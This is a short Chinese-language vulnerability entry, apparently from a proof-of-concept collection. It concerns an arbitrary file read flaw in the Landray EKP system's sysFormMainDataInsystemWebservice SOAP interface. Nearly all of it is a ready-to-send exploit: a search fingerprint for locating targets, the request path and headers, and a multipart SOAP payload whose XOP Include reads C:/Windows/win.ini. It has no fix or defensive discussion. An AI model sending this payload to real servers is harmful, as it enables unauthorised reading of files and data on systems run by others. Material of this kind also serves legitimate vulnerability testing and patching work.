# 蓝凌EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞

- **系统**：蓝凌EKP系统接口　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="Com_Parameter"`
- **请求**：`POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1`
- **关键头**：`Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz`　`SOAPAction: ""`

**请求体 / payload**
```
------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getData>
<arg0>
<beginTimeStamp>a</beginTimeStamp>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
</arg0>
</web:getData>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```
- **预期**：500　|　—